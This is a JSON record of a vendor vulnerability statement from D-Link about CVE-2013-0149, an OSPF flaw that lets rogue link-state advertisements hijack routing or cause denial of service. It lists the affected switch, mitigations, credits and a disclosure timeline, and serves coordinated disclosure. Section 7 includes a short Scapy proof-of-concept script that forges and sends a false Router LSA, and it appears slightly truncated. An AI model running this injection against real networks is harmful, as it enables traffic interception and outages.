{
  "Addendum": "There are no additional comments at this time.",
  "DateLastUpdated": "2013-08-05T11:39:00-04:00",
  "DateNotified": "2013-05-28T15:18:00-04:00",
  "DateResponded": "",
  "ID": "VU#229804",
  "Revision": 2,
  "Status": "Affected",
  "Vendor": "D-Link Systems, Inc.",
  "VendorInformation": "Please see DLINK-2013-VUL0213.",
  "VendorRecordID": "BLUU-985QRV",
  "VendorReferences": "None",
  "VendorStatement": "1. Advisory Information\nTitle: Open Shortest Path First (OSPF) Protocol does not specify unique LSA lookup identifiers\nD-Link ID: DLINK-2013-VUL0213\nAdvisory URL: TBD prior to Aug. 1, 2013\nDate published: August 1, 2013\nDate of last update: 7/29/13 (will update on saving document)\nReported by: CERT \nRelease mode: Coordinated Release 2. Vulnerability Information\nClass: CWE-694\nImpact: Critical \nRemotely Exploitable: Possible, but would require access via other product (s)\nLocally Exploitable: Yes\nCVE Name: CVE-2013-0149\n3. Vulnerability Description\nThe Open Shortest Path First (OSPF) protocol does not specify unique Link State \nAdvertisement (LSA) lookup identifiers, which allow an attacker to intercept traffic or \nconduct a Denial of Service (DoS) attack. This vulnerability can allow an attacker to re-route traffic through their own router, \ncompromising the confidentiality of the data, or to conduct a Denial of Service attack\nagainst a router, dropping all traffic. 4. Vulnerable Packages\nThe following is the list of known affected devices and the associated firmware \n(confirmed by D-Link). This will be updated as needed if additional units effected. 1. DES-3810-28 \u2013 R2.20.B017 (HW Not available in the US) 5. Vendor\tInformation, Solutions and Workarounds\nD-Link distributes a number of devices which could potentially be affected by this\nvulnerability; chiefly, any L3 managed switch that supports OSPF has the possibility of\nbeing subject to this attack. D-Link is working to reduce the potential impact of this vulnerability, which is a result of\nan ambiguous standard. Currently we advise the following: As always, adhering to best practices will be the strongest defense against attacks. As\nlong as your physical devices, networks, and protocols are secured, it will be very\ndifficult for an attacker to insert a rogue LSA to initiate this type of attack. First, this vulnerability does not defeat cryptographic (MD5) authentication, we\nrecommend a strong MD5 authentication key as your best defense. We also recommend that administrators enable the OSPF passive interface feature to\nstop sending or receiving routing table updates on interfaces that do not participate in\nOSPF. Finally, we recommend that networks use MAC-based Access Control (MAC) to\nauthenticate devices before they are able to communicate with the network. The MAC\nfeature is a client-less design so there is no need to install extra software on a user\u2019s\ncomputer, and ensures that only devices on a whitelist will have access to the network. When used in conjunction with common security best practices, it can help to strongly\nlimit the possible vectors of attack. D-Link is monitoring the situation for an update to the standard that can be implemented \nto protect potentially affected devices. 6. Credits\nDr. Gabi Nakibly - NEWRSC, Rafael - Advanced Defense Systems Ltd. Eitan Menahem - Telekom Innovation Laboratories, Ben Gurion University\nAriel Waizel - Telekom Innovation Laboratories, Ben Gurion University\nProf. Yuval Elovici - Telekom Innovation Laboratories, Ben Gurion University\nThe publication of this advisory was not coordinated with forementioned 7. Technical Description / Proof of Concept Code 7.1. OSPF \u201cFight Back\u201d is triggered by LSAs with matching Router ID only, and so can \nbe evaded by using non matching Router ID and Link State ID on a rogue LSA. Routing \nlookup uses only the Link State ID field, and so may, depending on implementation, \nresult in selecting the rogue LSA before the valid LSA. scappy proof of concept attack script attacker_source_ip = \"192.168.13.1\"\nattacker_router_id = \"192.168.18.1\"\nvictim_destination_ip = \"192.168.13.3\"\nvictim_router_id = \"192.168.37.3\"\nfalse_adv_router = \"192.168.27.11\"\nseq_num = 0x80000004L\nR3_FALSE_LSA = IP(src=attacker_source_ip, dst=victim_destination_ip) \\\n/OSPF_Hdr(src=attacker_router_id) \\\n/OSPF_LSUpd(lsalist=[ \\\nOSPF_Router_LSA(options=0x22, type=1, id=victim_router_id, adrouter=false_adv_router, \nseq=seq_num, linklist=[ \\\nOSPF_Link(id=\"192.168.37.7\", data=\"192.168.37.3\", type=2, metric=1), \\\nOSPF_Link(id=\"192.168.13.3\", data=\"192.168.13.3\", type=2, metric=1), \\\nOSPF_Link(id=\"192.168.50.0\", data=\"255.255.255.0\", type=3, metric=3) \\ send(R3_FALSE_LSA, iface=\"eth0\") 8. Report\tTimeline\n\u2022  May 28, 2013 \u2013 Notification by Cert of the issue\n\u2022  May 28, 2013 \u2013 Notify Qualified D-Link Resources of issue\n\u2022  June 6, 2013 \u2013 Cert notified embargo date changed to July 30\n\u2022  Jun 6, 2013 \u2013 D-Link Request Cert to resend details \n\u2022  June 11, 2013 \u2013 D-Link receives details\n\u2022  July 29, 2013 \u2013 Cert notified embargo date changed to Aug 1\n\u2022  July 29, 2013 \u2013 D-Link Sends Vulnerability Response Report to Cert\n\u2022  July 30, 2013 \u2013 D-Link Post Report for effected Products 9. References\n[1] CVE-229804-2013.pdf \u2013 Owning the Routing Table Part II 10. About\tD-Link\nD-Link is the global leader in connectivity for home, small business, mid- to large-sized enterprise \nenvironments, and service providers. An award-winning designer, developer, and manufacturer, D-Link \nimplements and supports unified network solutions that integrate capabilities in switching, wireless, \nbroadband, storage, IP Surveillance, and cloud-based network management. For more information visit \nwww.dlink.com, or connect with D-Link on Facebook (www.facebook.com/dlink) and Twitter \n(www.twitter.com/dlink). 11. Disclaimer\nD-Link and the D-Link logo are trademarks or registered trademarks of D-Link Corporation or its \nsubsidiaries. All other third-party marks mentioned herein may be trademarks of their respective owners. Copyright \u00a9 2013. D-Link. All Rights Reserved. References Authors: Patrick Cline - Patrick.Cline@dlink.com\nWilliam Brown \u2013 William.Brown@dlink.com"
}